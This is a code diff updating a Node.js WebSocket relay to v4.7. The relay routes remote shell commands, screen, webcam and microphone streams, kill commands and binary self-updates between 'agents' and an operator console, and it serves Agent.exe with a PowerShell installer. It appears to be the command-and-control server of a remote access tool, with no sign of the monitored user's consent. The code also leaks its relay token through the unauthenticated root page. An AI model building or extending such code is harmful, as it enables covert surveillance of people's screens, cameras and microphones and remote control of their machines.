@@ -1,14 +1,47 @@
 // ============================================================================
-// relay.js  —  v4.2
+// relay.js  —  v4.7
 //
-// Differences vs v4.1:
-//   - Forwards {op:"pcm"} from agent to attached operator (mic stream).
-//   - Accepts {op:"mic"} from operator, forwards to agent.
-//   - /debug and /health now count pcm frames too.
-//   - All v4.1 fixes retained (const wsSafe, op objects, heartbeat,
-//     auto-attach on lone agent, verbose logging, graceful shutdown).
+// Differences vs v4.6:
+//   - Bootstrap endpoints for machines that cannot self-update yet:
+//       GET /agent.exe          the built Agent.exe
+//       GET /agent.sha256       its SHA-256, for the installer to verify
+//       GET /install-agent.ps1  the installer script
+//     All three require the relay token (X-Relay-Token header, or ?token=).
+//   - Query strings are stripped from HTTP logs: /ws?token=... was writing the
+//     relay token into the Render log stream.
 //
-// Deploy: Render Web Service (Node 20+)
+// Differences vs v4.5:
+//   - The operator console is served by this process at "/", so the UI and the
+//     relay ship as one Render service. No separate static host, no hardcoded
+//     relay URL in the page: the relay injects { ws, token } into the HTML it
+//     serves, and the page falls back to its own origin when nothing is
+//     injected (local `node relay.js`).
+//   - The HTML is served with cache-control: no-store, so a redeploy is picked
+//     up on reload instead of being shadowed by a cached copy.
+//
+// Differences vs v4.4:
+//   - Agent self-update: forwards {op:"upd"} (begin/chunk/end/abort) down and
+//     {op:"updstate"} progress back up. The relay only routes the bytes; the
+//     agent verifies size and SHA-256 before touching its install path.
+//
+// Differences vs v4.3:
+//   - Camera stream support: forwards {op:"camera"} / {op:"cameraOnce"} to the
+//     agent, {op:"cam"} state echoes and {op:"camframe"} JPEG frames back.
+//   - Per-agent camera stream state (camOn/quality/maxW/intervalMs) echoed to
+//     operators on attach, and force-stopped when nobody is watching.
+//
+// Differences vs v4.2:
+//   - Agents are keyed by a unique per-connection id (sid), not by hostname.
+//     Duplicate copies on one host can no longer shadow each other, which was
+//     the reason "stop" reached only one agent while another kept streaming.
+//   - Relay tracks per-agent stream state (streamOn/quality/maxW/intervalMs)
+//     and echoes it to operators on attach.
+//   - Safety net: a stream is stopped when no operator is watching the agent
+//     (operator detach / attach switch / disconnect / agent death).
+//   - Forwards {op:"shot"} (stream state), {op:"micPeak"} and {op:"micDiag"}.
+//   - All v4.2 fixes retained (pcm forwarding, heartbeat, graceful shutdown).
+//
+// Deploy: Render Web Service (Node 20+), console included
 //   Build:  npm install
 //   Start:  node relay.js
 //   Env:    RELAY_TOKEN=<32+ hex>   (required)
@@ -17,7 +50,7 @@
 // Endpoints:
 //   GET /health   -> tiny JSON status (cron keeps service warm)
 //   GET /debug    -> full state, per-agent counters
-//   GET /         -> operator.html if present, else 200 plain text
+//   GET /         -> operator console, with relay config injected
 //   WS  /ws       -> agent + operator channels (?role=&token=)
 // ============================================================================
 
@@ -38,6 +71,20 @@ const TOKEN   = process.env.RELAY_TOKEN;
 const PORT    = process.env.PORT || 10000;
 const HOST    = process.env.HOST || '0.0.0.0';
 
+// Binary the relay hands out to agents that cannot self-update yet, plus the
+// bootstrap script that installs it. Overridable so the test harness can serve
+// a patched build without touching the real one.
+const AGENT_EXE    = process.env.AGENT_EXE || path.join(__dirname, 'Agent.exe');
+const INSTALL_PS1  = path.join(__dirname, 'install-agent.ps1');
+
+// The token may arrive as a header (preferred, never logged) or a query param
+// (kept for convenience, stripped from logs above).
+function tokenOk(req, url) {
+  const h = req.headers['x-relay-token'];
+  if (typeof h === 'string' && h === TOKEN) return true;
+  return url.searchParams.get('token') === TOKEN;
+}
+
 // ---------------------------------------------------------------------------
 // Logging
 // ---------------------------------------------------------------------------
@@ -51,7 +98,7 @@ function debug(...a) { if (process.env.RELAY_DEBUG) console.log(tag('DEBUG'), ..
 // ---------------------------------------------------------------------------
 // Boot banner
 // ---------------------------------------------------------------------------
-info('relay v4.2 booting');
+info('relay v4.7 booting');
 info('  node     ', process.version);
 info('  pid      ', process.pid);
 info('  boot_ts  ', BOOT_TS);
@@ -78,7 +125,10 @@ const wsSafe = (sock, payload) => {
 // ---------------------------------------------------------------------------
 // State
 // ---------------------------------------------------------------------------
-const agents    = new Map();   // id -> { ws, info, lastSeen, framesSent, outsSent, logsSent, pcmSent }
+// sid (unique per connection) -> { sid, id, ws, info, lastSeen, counters,
+//                                  streamOn, shotQuality, shotMaxW, shotIntervalMs,
+//                                  camOn, camQuality, camMaxW, camIntervalMs }
+const agents    = new Map();
 const operators = new Set();   // Set of op objects: { ws, id, attachedTo }
 let   opSeq     = 0;
 
@@ -88,6 +138,8 @@ const stats = {
   wsRejects:       0,
   framesIn:        0,
   framesForwarded: 0,
+  camFramesIn:     0,
+  camFramesForwarded: 0,
   outsIn:          0,
   outsForwarded:   0,
   logsIn:          0,
@@ -95,6 +147,7 @@ const stats = {
   pcmIn:           0,
   pcmForwarded:    0,
   cmdsForwarded:   0,
+  forcedStops:     0,
   drops:           0
 };
 
@@ -108,11 +161,16 @@ const server = http.createServer((req, res) => {
   const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?')
              .toString().split(',')[0].trim();
   const ua = (req.headers['user-agent'] || '-').slice(0, 60);
-  info(`http ${req.method} ${req.url} ip=${ip} ua="${ua}"`);
+  // Never log the query string: it can carry the relay token.
+  const route = req.url.split('?')[0];
+  info(`http ${req.method} ${route} ip=${ip} ua="${ua}"`);
 
   res.on('finish', () => {
-    info(`http ${req.method} ${req.url} -> ${res.statusCode} (${Date.now()-t0}ms)`);
+    info(`http ${req.method} ${route} -> ${res.statusCode} (${Date.now()-t0}ms)`);
   });
+
+  let url = null;
+  try { url = new URL(req.url, 'http://relay'); } catch { /* malformed */ }
 
   if (req.url === '/health') {
     res.writeHead(200, {'content-type':'application/json'});
@@ -130,15 +188,25 @@ const server = http.createServer((req, res) => {
 
   if (req.url === '/debug') {
     const ag = [];
-    for (const [id, a] of agents) ag.push({
-      id,
+    for (const a of agents.values()) ag.push({
+      sid: a.sid,
+      id: a.id,
       info: a.info,
       lastSeen: a.lastSeen,
       age_s: Math.floor((Date.now()-a.lastSeen)/1000),
       framesSent: a.framesSent,
+      camFramesSent: a.camFramesSent,
       outsSent: a.outsSent,
       logsSent: a.logsSent,
-      pcmSent: a.pcmSent
+      pcmSent: a.pcmSent,
+      streamOn: a.streamOn,
+      shotQuality: a.shotQuality,
+      shotMaxW: a.shotMaxW,
+      shotIntervalMs: a.shotIntervalMs,
+      camOn: a.camOn,
+      camQuality: a.camQuality,
+      camMaxW: a.camMaxW,
+      camIntervalMs: a.camIntervalMs
     });
     const op = [];
     for (const o of operators) op.push({
@@ -154,14 +222,73 @@ const server = http.createServer((req, res) => {
     return;
   }
 
-  if (req.url === '/' || req.url === '/index.html') {
+  if (req.url === '/favicon.ico') {
+    res.writeHead(204);
+    res.end();
+    return;
+  }
+
+  if (route === '/agent.exe' || route === '/agent.sha256' || route === '/install-agent.ps1') {
+    if (!url || !tokenOk(req, url)) {
+      res.writeHead(401, {'content-type':'text/plain'});
+      res.end('unauthorized\n');
+      return;
+    }
     try {
-      const html = fs.readFileSync(path.join(__dirname, 'operator.html'));
-      res.writeHead(200, {'content-type':'text/html; charset=utf-8'});
-      res.end(html);
-    } catch {
-      res.writeHead(200, {'content-type':'text/plain; charset=utf-8'});
-      res.end('relay ok — operator UI is served from Netlify\n');
+      if (route === '/install-agent.ps1') {
+        const ps1 = fs.readFileSync(INSTALL_PS1, 'utf8');
+        res.writeHead(200, {
+          'content-type': 'text/plain; charset=utf-8',
+          'cache-control': 'no-store, must-revalidate'
+        });
+        res.end(ps1);
+        return;
+      }
+      const bin = fs.readFileSync(AGENT_EXE);
+      if (route === '/agent.sha256') {
+        res.writeHead(200, {
+          'content-type': 'text/plain; charset=utf-8',
+          'cache-control': 'no-store, must-revalidate'
+        });
+        res.end(require('crypto').createHash('sha256').update(bin).digest('hex') + '\n');
+        return;
+      }
+      res.writeHead(200, {
+        'content-type': 'application/octet-stream',
+        'content-length': bin.length,
+        'content-disposition': 'attachment; filename="Agent.exe"',
+        'cache-control': 'no-store, must-revalidate'
+      });
+      res.end(bin);
+    } catch (e) {
+      error(`${route} unavailable:`, e.message);
+      res.writeHead(404, {'content-type':'text/plain'});
+      res.end('not found\n');
+    }
+    return;
+  }
+
+  if (route === '/' || route === '/index.html') {
+    try {
+      const html = fs.readFileSync(path.join(__dirname, 'operator.html'), 'utf8');
+      // The page ships with the relay, so it never carries a relay URL or token
+      // of its own. Hand both to it here; the client falls back to its own
+      // origin when this block is absent.
+      const cfg = '<script>window.__RELAY_CFG__=' +
+                  JSON.stringify({ ws: null, token: TOKEN }).replace(/</g, '\\u003c') +
+                  ';</script>';
+      const page = html.includes('</head>')
+        ? html.replace('</head>', cfg + '</head>')
+        : cfg + html;
+      res.writeHead(200, {
+        'content-type': 'text/html; charset=utf-8',
+        'cache-control': 'no-store, must-revalidate'
+      });
+      res.end(page);
+    } catch (e) {
+      error('operator.html unavailable:', e.message);
+      res.writeHead(500, {'content-type':'text/plain; charset=utf-8'});
+      res.end('operator console missing on this deploy (operator.html)\n');
     }
     return;
   }
@@ -205,7 +332,7 @@ wss.on('connection', (ws, req) => {
 // Agent
 // ---------------------------------------------------------------------------
 function onAgent(ws, req) {
-  let id = null;
+  let sid = null;
 
   ws.on('message', (raw) => {
     let msg;
@@ -213,58 +340,95 @@ function onAgent(ws, req) {
     catch { warn('agent sent bad JSON, dropped'); return; }
 
     if (msg.op === 'hello') {
-      id = String(msg.id || randomUUID());
-      agents.set(id, {
+      const reported = String(msg.id || 'agent');
+      sid = randomUUID();
+      agents.set(sid, {
+        sid,
+        id: reported,
         ws, info: msg.info || {}, lastSeen: Date.now(),
-        framesSent: 0, outsSent: 0, logsSent: 0, pcmSent: 0
+        framesSent: 0, outsSent: 0, logsSent: 0, pcmSent: 0,
+        camFramesSent: 0,
+        streamOn: false, shotQuality: 80, shotMaxW: 0, shotIntervalMs: 500,
+        camOn: false, camQuality: 80, camMaxW: 0, camIntervalMs: 500
       });
-      info(`agent ONLINE id=${id} host=${msg.info?.hostname || '?'} user=${msg.info?.user || '?'}`);
+      const twins = [...agents.values()].filter(a => a.id === reported).length - 1;
+      info(`agent ONLINE sid=${sid} id=${reported} host=${msg.info?.hostname || '?'} ` +
+           `user=${msg.info?.user || '?'}${twins ? ` (duplicate id, ${twins} other copy)` : ''}`);
       broadcastAgentList();
       autoAttachIfLone();
       return;
     }
 
-    if (!id || !agents.has(id)) {
+    if (!sid || !agents.has(sid)) {
       warn(`agent msg before hello, dropped op=${msg.op}`);
       return;
     }
-    const a = agents.get(id);
+    const a = agents.get(sid);
     a.lastSeen = Date.now();
 
-    if (msg.op === 'frame') { stats.framesIn++; a.framesSent++; }
-    if (msg.op === 'out')   { stats.outsIn++;   a.outsSent++;   }
-    if (msg.op === 'log')   { stats.logsIn++;   a.logsSent++;   }
-    if (msg.op === 'pcm')   { stats.pcmIn++;    a.pcmSent++;    }
+    if (msg.op === 'frame')    stats.framesIn++;
+    if (msg.op === 'camframe') stats.camFramesIn++;
+    if (msg.op === 'out')      stats.outsIn++;
+    if (msg.op === 'log')      stats.logsIn++;
+    if (msg.op === 'pcm')      stats.pcmIn++;
+    if (msg.op === 'frame')    a.framesSent++;
+    if (msg.op === 'camframe') a.camFramesSent++;
+    if (msg.op === 'out')      a.outsSent++;
+    if (msg.op === 'log')      a.logsSent++;
+    if (msg.op === 'pcm')      a.pcmSent++;
 
-    if (msg.op === 'out' || msg.op === 'frame' || msg.op === 'pcm' ||
-        msg.op === 'pong' || msg.op === 'log') {
+    if (msg.op === 'out' || msg.op === 'frame' || msg.op === 'camframe' ||
+        msg.op === 'pcm' || msg.op === 'pong' || msg.op === 'log' ||
+        msg.op === 'shot' || msg.op === 'cam' || msg.op === 'updstate' ||
+        msg.op === 'micPeak' || msg.op === 'micDiag') {
+      // Keep relay-side stream state in sync with what the agent reports.
+      if (msg.op === 'shot') {
+        a.streamOn       = msg.on === true;
+        a.shotQuality    = Number(msg.quality ?? a.shotQuality);
+        a.shotMaxW       = Number(msg.maxW ?? a.shotMaxW);
+        a.shotIntervalMs = Number(msg.intervalMs ?? a.shotIntervalMs);
+      }
+      if (msg.op === 'cam') {
+        a.camOn          = msg.on === true;
+        a.camQuality     = Number(msg.quality ?? a.camQuality);
+        a.camMaxW        = Number(msg.maxW ?? a.camMaxW);
+        a.camIntervalMs  = Number(msg.intervalMs ?? a.camIntervalMs);
+      }
       let forwarded = 0;
       for (const op of operators) {
-        if (op.attachedTo === id) {
-          if (wsSafe(op.ws, JSON.stringify({ ...msg, id }))) forwarded++;
+        if (op.attachedTo === sid) {
+          if (wsSafe(op.ws, JSON.stringify({ ...msg, id: sid }))) forwarded++;
         }
       }
-      if (msg.op === 'frame') stats.framesForwarded += forwarded;
-      if (msg.op === 'out')   stats.outsForwarded   += forwarded;
-      if (msg.op === 'log')   stats.logsForwarded   += forwarded;
-      if (msg.op === 'pcm')   stats.pcmForwarded    += forwarded;
+      if (msg.op === 'frame')    stats.framesForwarded    += forwarded;
+      if (msg.op === 'camframe') stats.camFramesForwarded += forwarded;
+      if (msg.op === 'out')      stats.outsForwarded      += forwarded;
+      if (msg.op === 'log')      stats.logsForwarded      += forwarded;
+      if (msg.op === 'pcm')      stats.pcmForwarded       += forwarded;
 
-      const n = a.framesSent + a.outsSent + a.logsSent + a.pcmSent;
+      const n = a.framesSent + a.camFramesSent + a.outsSent + a.logsSent + a.pcmSent;
       if (forwarded === 0 && n % 20 === 1) {
         stats.drops++;
-        warn(`DROP agent=${id} op=${msg.op} (no operator attached, total dropped=${stats.drops})`);
+        warn(`DROP agent=${sid} op=${msg.op} (no operator attached, total dropped=${stats.drops})`);
       }
     }
   });
 
   ws.on('close', (code, reason) => {
-    if (id) {
-      info(`agent OFFLINE id=${id} code=${code} reason=${reason || '-'}`);
-      agents.delete(id);
-      broadcastAgentList();
+    if (!sid) return;
+    const a = agents.get(sid);
+    info(`agent OFFLINE sid=${sid} id=${a?.id || '?'} code=${code} reason=${reason || '-'}`);
+    agents.delete(sid);
+    // Detach every operator pointing at the dead agent, and tell them why.
+    for (const op of operators) {
+      if (op.attachedTo === sid) {
+        op.attachedTo = null;
+        wsSafe(op.ws, JSON.stringify({ op: 'agentGone', id: sid }));
+      }
     }
+    broadcastAgentList();
   });
-  ws.on('error', (e) => warn(`agent ws error id=${id||'?'}: ${e.message}`));
+  ws.on('error', (e) => warn(`agent ws error sid=${sid||'?'}: ${e.message}`));
 }
 
 // ---------------------------------------------------------------------------
@@ -289,14 +453,30 @@ function onOperator(ws, req) {
       return;
     }
     if (msg.op === 'attach') {
-      op.attachedTo = String(msg.id);
-      info(`operator op${op.id} attached -> ${op.attachedTo}`);
-      wsSafe(ws, JSON.stringify({ op: 'attached', id: op.attachedTo }));
+      const key = resolveAgent(msg.id);
+      const prev = op.attachedTo;
+      op.attachedTo = key;
+      info(`operator op${op.id} attached -> ${key || 'detached'}`);
+      if (prev && prev !== key) stopStreamIfIdle(prev);
+      wsSafe(ws, JSON.stringify({ op: 'attached', id: key }));
+      // Tell the UI what the agent's streams are actually doing right now.
+      const a = key ? agents.get(key) : null;
+      if (a) {
+        wsSafe(ws, JSON.stringify({
+          op: 'shot', on: !!a.streamOn, quality: a.shotQuality,
+          maxW: a.shotMaxW, intervalMs: a.shotIntervalMs
+        }));
+        wsSafe(ws, JSON.stringify({
+          op: 'cam', on: !!a.camOn, quality: a.camQuality,
+          maxW: a.camMaxW, intervalMs: a.camIntervalMs
+        }));
+      }
       return;
     }
     if (msg.op === 'in' || msg.op === 'screenshot' ||
-        msg.op === 'screenshotOnce' || msg.op === 'mic' ||
-        msg.op === 'kill') {
+        msg.op === 'screenshotOnce' || msg.op === 'camera' ||
+        msg.op === 'cameraOnce' || msg.op === 'mic' ||
+        msg.op === 'upd' || msg.op === 'kill') {
       if (!op.attachedTo) {
         warn(`operator op${op.id} ${msg.op} with no target`);
         wsSafe(ws, JSON.stringify({ op: 'err', reason: 'no target' }));
@@ -314,7 +494,27 @@ function onOperator(ws, req) {
         return;
       }
       stats.cmdsForwarded++;
-      info(`operator op${op.id} -> agent ${op.attachedTo} : ${msg.op}`);
+      if (msg.op === 'screenshot') {
+        a.streamOn = msg.on === true;
+        if (a.streamOn) {
+          if (Number.isFinite(Number(msg.quality)))    a.shotQuality    = Number(msg.quality);
+          if (Number.isFinite(Number(msg.maxW)))       a.shotMaxW       = Number(msg.maxW);
+          if (Number.isFinite(Number(msg.intervalMs))) a.shotIntervalMs = Number(msg.intervalMs);
+        }
+        info(`operator op${op.id} -> agent ${a.sid} stream ${a.streamOn ? 'ON' : 'OFF'}` +
+             (a.streamOn ? ` q=${a.shotQuality} maxW=${a.shotMaxW || 'native'} iv=${a.shotIntervalMs}ms` : ''));
+      } else if (msg.op === 'camera') {
+        a.camOn = msg.on === true;
+        if (a.camOn) {
+          if (Number.isFinite(Number(msg.quality)))    a.camQuality    = Number(msg.quality);
+          if (Number.isFinite(Number(msg.maxW)))       a.camMaxW       = Number(msg.maxW);
+          if (Number.isFinite(Number(msg.intervalMs))) a.camIntervalMs = Number(msg.intervalMs);
+        }
+        info(`operator op${op.id} -> agent ${a.sid} camera ${a.camOn ? 'ON' : 'OFF'}` +
+             (a.camOn ? ` q=${a.camQuality} maxW=${a.camMaxW || 'native'} iv=${a.camIntervalMs}ms` : ''));
+      } else {
+        info(`operator op${op.id} -> agent ${a.sid} : ${msg.op}`);
+      }
       return;
     }
     warn(`operator op${op.id} unknown op=${msg.op}`);
@@ -323,6 +523,8 @@ function onOperator(ws, req) {
   ws.on('close', (code, reason) => {
     info(`operator DISCONNECT id=op${op.id} code=${code} reason=${reason || '-'} total=${operators.size - 1}`);
     operators.delete(op);
+    // Nobody is watching any more: stop the agent from burning bandwidth.
+    stopStreamIfIdle(op.attachedTo);
   });
   ws.on('error', (e) => warn(`operator op${op.id} ws error: ${e.message}`));
 }
@@ -332,9 +534,52 @@ function onOperator(ws, req) {
 // ---------------------------------------------------------------------------
 function listAgents() {
   const out = [];
-  for (const [id, a] of agents)
-    out.push({ id, info: a.info, lastSeen: a.lastSeen });
+  const seen = new Map();
+  for (const a of agents.values()) {
+    const n = (seen.get(a.id) || 0) + 1;
+    seen.set(a.id, n);
+    out.push({
+      id: a.sid,                                   // attach target (unique)
+      name: n > 1 ? `${a.id}#${n}` : a.id,         // display label
+      info: a.info,
+      lastSeen: a.lastSeen,
+      streaming: !!a.streamOn,
+      camStreaming: !!a.camOn
+    });
+  }
   return out;
+}
+
+// Accept both a sid (current UI) and a bare hostname (older cached UI).
+function resolveAgent(key) {
+  if (!key) return null;
+  const k = String(key);
+  if (agents.has(k)) return k;
+  for (const a of agents.values()) if (a.id === k) return a.sid;
+  return null;
+}
+
+// Stop an agent's streams when no operator is attached to it any more.
+function stopStreamIfIdle(sid) {
+  if (!sid) return;
+  for (const op of operators) if (op.attachedTo === sid) return;
+  const a = agents.get(sid);
+  if (!a) return;
+  let stopped = false;
+  if (a.streamOn &&
+      wsSafe(a.ws, JSON.stringify({ op: 'screenshot', on: false }))) {
+    a.streamOn = false;
+    stopped = true;
+  }
+  if (a.camOn &&
+      wsSafe(a.ws, JSON.stringify({ op: 'camera', on: false }))) {
+    a.camOn = false;
+    stopped = true;
+  }
+  if (stopped) {
+    stats.forcedStops++;
+    info(`streams OFF (no operators watching) agent=${sid} id=${a.id}`);
+  }
 }
 
 function broadcastAgentList() {
@@ -346,12 +591,20 @@ function broadcastAgentList() {
 
 function autoAttachIfLone() {
   if (agents.size !== 1) return;
-  const onlyId = [...agents.keys()][0];
+  const only = [...agents.values()][0];
   for (const op of operators) {
     if (!op.attachedTo) {
-      op.attachedTo = onlyId;
-      wsSafe(op.ws, JSON.stringify({ op: 'attached', id: onlyId }));
-      info(`auto-attach operator op${op.id} -> ${onlyId}`);
+      op.attachedTo = only.sid;
+      wsSafe(op.ws, JSON.stringify({ op: 'attached', id: only.sid }));
+      wsSafe(op.ws, JSON.stringify({
+        op: 'shot', on: !!only.streamOn, quality: only.shotQuality,
+        maxW: only.shotMaxW, intervalMs: only.shotIntervalMs
+      }));
+      wsSafe(op.ws, JSON.stringify({
+        op: 'cam', on: !!only.camOn, quality: only.camQuality,
+        maxW: only.camMaxW, intervalMs: only.camIntervalMs
+      }));
+      info(`auto-attach operator op${op.id} -> ${only.sid} (${only.id})`);
     }
   }
 }
@@ -362,10 +615,11 @@ function autoAttachIfLone() {
 setInterval(() => {
   info(`heartbeat agents=${agents.size} operators=${operators.size} ` +
        `frames=${stats.framesIn}/${stats.framesForwarded} ` +
+       `cam=${stats.camFramesIn}/${stats.camFramesForwarded} ` +
        `outs=${stats.outsIn}/${stats.outsForwarded} ` +
        `pcm=${stats.pcmIn}/${stats.pcmForwarded} ` +
        `logs=${stats.logsIn}/${stats.logsForwarded} ` +
-       `cmds=${stats.cmdsForwarded} drops=${stats.drops}`);
+       `cmds=${stats.cmdsForwarded} forcedStops=${stats.forcedStops} drops=${stats.drops}`);
 }, 60000).unref();
 
 // ---------------------------------------------------------------------------
@@ -386,6 +640,6 @@ process.on('unhandledRejection', (e) => { error('UNHANDLED REJECTION:', e?.stack
 // Listen
 // ---------------------------------------------------------------------------
 server.listen(PORT, HOST, () => {
-  info(`relay v4.2 LIVE on ${HOST}:${PORT}`);
-  info('endpoints:  /health  /debug  /ws  /');
+  info(`relay v4.7 LIVE on ${HOST}:${PORT}`);
+  info('endpoints:  /health  /debug  /ws  / (console)  /agent.exe  /install-agent.ps1');
 });
